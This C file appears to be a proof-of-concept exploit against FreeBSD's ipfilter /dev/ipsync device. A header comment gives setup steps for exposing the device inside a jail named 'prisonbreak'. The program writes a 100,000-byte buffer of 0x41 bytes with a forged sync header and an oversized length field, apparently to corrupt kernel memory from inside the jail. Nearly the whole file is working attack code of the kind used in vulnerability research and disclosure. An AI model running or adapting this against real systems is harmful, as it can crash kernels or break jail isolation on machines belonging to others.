#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>

#define u_32_t unsigned int

#define LEN 100000

/*
Prerequisites
-------------
1. Host must have ipfilter kernel module loaded

kldload ipfilter


2. ipfilter device /dev/ipsync must be visible in jail

cat << 'EOF' > /etc/devfs.rules
[devfsrules_ipf=5]
add path ipsync    unhide
EOF

service devfs restart
service jail restart prisonbreak
*/

typedef struct  synchdr {
  u_32_t    sm_magic; /* magic */
  u_char    sm_v;   /* version: 4,6 */
  u_char    sm_p;   /* protocol */
  u_char    sm_cmd;   /* command */
  u_char    sm_table; /* NAT, STATE, etc */
  u_int   sm_num;   /* table entry number */
  int   sm_rev;   /* forward/reverse */
  int   sm_len;   /* length of the data section */
  void *sm_sl;   /* back pointer to parent */
} synchdr_t;

int main() {
  int fd = open("/dev/ipsync", O_RDWR);

  if (fd < 0) {
    printf("Error: failed to open /dev/ipsync\n");
    exit(0);
  }

  synchdr_t *header = malloc(LEN);
  memset(header, 0x41, LEN);
  header->sm_magic = htonl(0x0FF51DE5);
  header->sm_v = 4;
  header->sm_cmd = 0;
  header->sm_table = 0;
  header->sm_len = htonl(LEN - 100);


  int error = write(fd, header, LEN);
  perror("Write failed: ");
  printf("error: %d\n", error);
  printf("errno: %d\n", errno);

  close(fd);
  return 0;
}
